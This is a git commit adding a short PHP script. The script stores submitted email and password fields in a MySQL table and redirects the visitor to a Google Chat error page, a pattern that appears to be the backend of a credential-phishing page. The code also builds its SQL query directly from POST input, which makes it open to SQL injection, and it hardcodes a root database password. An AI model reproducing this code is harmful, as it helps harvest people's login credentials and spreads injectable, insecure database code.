2db1506d43e468ac7c5515130bee91bca2ea20b8
dlrhdxn <52860565+dlrhdxn@users.noreply.github.com>
2021-01-02 01:10:31 +0900

    Add files via upload

---
+++ process_create.php
@@ -0,0 +1,21 @@
+<?php
+echo("<script>window.location.href='https://chat.google.com/error/noaccess?pli=1/'</script>");
+$severname="localhost";
+$username="root";
+$password="1345";
+$dbname="info";
+$conn=mysqli_connect("$severname","$username","$password","$dbname");
+var_dump($_POST);
+$sql="
+    INSERT INTO topic(email,pw)
+    VALUES(
+        '{$_POST['email']}',
+        '{$_POST['pw']}'
+    )
+
+";
+$result=mysqli_query($conn,$sql);
+if($result===false){
+    echo '저장하는도중 문제가생겻습니다.';
+}
+?>
